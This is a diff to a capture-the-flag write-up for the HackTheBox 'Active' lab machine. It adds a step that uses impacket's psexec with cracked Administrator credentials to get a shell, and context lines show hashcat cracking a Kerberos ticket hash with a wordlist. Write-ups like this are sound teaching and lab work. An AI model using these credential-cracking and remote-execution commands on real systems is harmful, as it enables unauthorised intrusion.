@@ -1,6 +1,6 @@
 # Active
 
-# User Flag
+# User & Root Flag
 
 ## NMAP Enumeration
 
@@ -139,7 +139,11 @@ hashcat64.exe -m 13100 hash.txt rockyou.txt -o cracked.txt
 
 New set of credentials: `Administrator:Ticketmaster1968`.
 
-## 
+Used `psexec` to gain a shell and get user and root flag.
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
+```
 
 
 
